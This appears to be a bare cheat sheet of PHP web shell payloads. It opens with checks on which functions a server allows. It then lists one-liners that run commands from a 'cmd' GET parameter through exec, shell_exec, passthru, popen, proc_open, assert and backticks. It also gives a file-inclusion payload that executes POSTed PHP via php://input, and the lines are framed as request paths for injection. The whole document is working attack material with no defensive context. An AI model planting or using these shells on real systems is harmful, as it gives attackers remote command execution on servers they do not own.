
Check functions
<?php phpinfo(); ?>
or
<?php echo ini_get('disable_functions'); ?>

<?php
GET /<?php exec($_GET['cmd']); ?>

<?php
GET /<?php echo shell_exec($_GET['cmd']); ?>

<?php
GET /<?php passthru($_GET['cmd']); ?>

<?php
GET /<?php $fp = popen($_GET['cmd'], 'r'); while(!feof($fp)){echo fread($fp,1024);} pclose($fp); ?>

<?php
GET /<?php $p=proc_open($_GET['cmd'],[1=>['pipe','w']],$o);echo stream_get_contents($o[1]); ?>

<?php
GET /<?php assert($_GET['cmd']); ?>
# Use: ?cmd=system('id');

<?php
GET /<?php include($_GET['file']); ?>
# Use: ?file=php://input (then POST PHP code in the body)

<?php
GET /<?php echo `$_GET['cmd']`; ?>










